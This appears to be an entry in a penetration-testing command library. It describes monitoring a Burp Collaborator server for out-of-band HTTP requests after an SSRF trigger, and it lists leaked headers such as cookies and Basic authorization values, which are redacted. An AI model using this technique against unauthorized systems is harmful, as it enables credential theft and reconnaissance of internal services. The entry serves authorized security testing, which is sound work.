---
data: >-
  # Monitored via Burp Collaborator UI

  GET / HTTP/1.1

  Host: ████████.burpcollaborator.net

  # Leaked headers: User-Agent, Accept-Encoding, Cookie, Authorization: Basic
  ████████, X-BlueCoat-Via
tags:
  - oob
  - monitoring
type: command
output: Received request with internal details from target server
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.008Z'
id: 6a4eb4e1-c127-42a9-8a76-a58fdfa79511
verified: false
validated: true
submitted: true
---
# observe-collaborator-connection

## Command

```http
# Observed in Burp Collaborator:
GET / HTTP/1.1
Host: ████████.burpcollaborator.net
# Includes leaked: Accept-Encoding: gzip, deflate; Connection: close; Authorization: Basic ████████
```

## Description

Reviews incoming SSRF connections on the collaborator server to extract leaked information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | UI-based observation | N/A |

## Examples

### Basic Usage

Monitor Burp Collaborator for GET requests post-SSRF trigger.

## Expected Output

Full HTTP request details, including sensitive headers and source IP.

## Related

- [[commands/ssrf-host-header-get]]
